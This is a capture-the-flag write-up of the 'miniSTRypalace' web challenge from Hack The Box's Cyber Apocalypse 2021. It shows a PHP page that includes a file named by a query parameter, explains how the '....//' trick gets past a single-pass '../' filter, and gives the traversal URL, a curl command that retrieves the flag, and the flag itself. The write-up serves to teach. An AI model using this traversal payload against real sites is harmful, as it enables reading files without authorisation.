---
slug: ministrypalace-cyberapocalypse-2021-ctf
title: miniSTRypalace - Cyberapocalypse 2021 CTF
description: This is a writeup for the miniSTRypalace challenge, part of the Hack the box's Cyberapocalypse CTF 2021, category Web.
authors: kiroki
tags: [Cyber Security, CTF]
---

This is a writeup for the miniSTRypalace challenge, part of the Hack the box's Cyberapocalypse CTF 2021, category Web.

### Prompt

Let’s read this website in the language of Alines. Or maybe not?

<!-- truncate -->

### Recon

We get the source code for a website, and we're informed by a docker environment setup, that the flag will be at the root of the system.

```
# Dockerfile
[redacted]

# Copy challenge files
COPY challenge /www
COPY flag /

[redacted]
```

From the source code, we can see that this is a PHP application, and we can inspect the `index.php` file.

```php
<html>
    <header>
        <meta name='author' content='bertolis, makelaris'>
        <title>Ministry of Defence</title>
        <link rel="stylesheet" href="/static/css/main.css">
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootswatch/4.5.0/slate/bootstrap.min.css"   >
    </header>

    <body>
    <div class="language">
        <a href="?lang=en.php">EN</a>
        <a href="?lang=qw.php">QW</a>
    </div>

    <?php
    $lang = ['en.php', 'qw.php'];
        include('pages/' . (isset($_GET['lang']) ? str_replace('../', '', $_GET['lang']) : $lang[array_rand($lang)]));
    ?>
    </body>
</html>
```

### Analysis

We see from the PHP file, that the query param `lang` will include a file from the filesystem. Its main use is to provide us with language support by using either `en.php` or `qw.php` as language files, but we see other uses for it - namely **local file inclusion**.

The only problem, is that there is a `str_replace` method being called, which removes any string of the form `../` from the query. But we need `../` to get to the root directory, where the flag is.

### Solution

Since `str_replace` will run through our string only once, all we need to do is supply a buffer to the string `../` by making it for example into `....//` or  `.../...//`, or anything similar to that.

So, all we have to do is navigate to the following url

```
http://<vulnerablesite:port>/?lang=....//....//flag
```

Or, if we want to be cheeky, we can script this by running

```sh
curl http://<vulnerablesite:port>/?lang=....//....//flag | grep CHTB{.*} --color=none
```

To directly get our flag as output

```
CHTB{b4d_4li3n_pr0gr4m1ng}
```